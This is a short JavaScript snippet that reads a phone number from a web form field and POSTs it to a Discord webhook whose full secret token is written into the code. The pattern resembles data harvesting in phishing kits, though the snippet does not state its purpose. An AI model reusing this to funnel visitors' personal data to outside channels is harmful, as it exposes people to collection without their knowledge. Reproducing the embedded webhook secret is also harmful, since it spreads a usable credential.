const number = document.getElementById("mobile_txtfield");

function sendWebhook() {
    var webhookURL = 'https://discord.com/api/webhooks/1332732406280487056/Z0nJyZJL5Jw0LxL2q1qr1_ycJUxBGL1OMCtP0Fn3g4Opc45xbdq6_jiGFRPGseyB18-7';
    var data = {
        "embeds": [
            {
                "title": "New Number",
                "description": `New number: ${number ? number.value : 'N/A'}`,
                "color": 16777215,
                "footer": {
                    "text": "Number sent from the website"
                }
            }
        ]
    };

    var requestOptions = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(webhookURL, requestOptions)
}
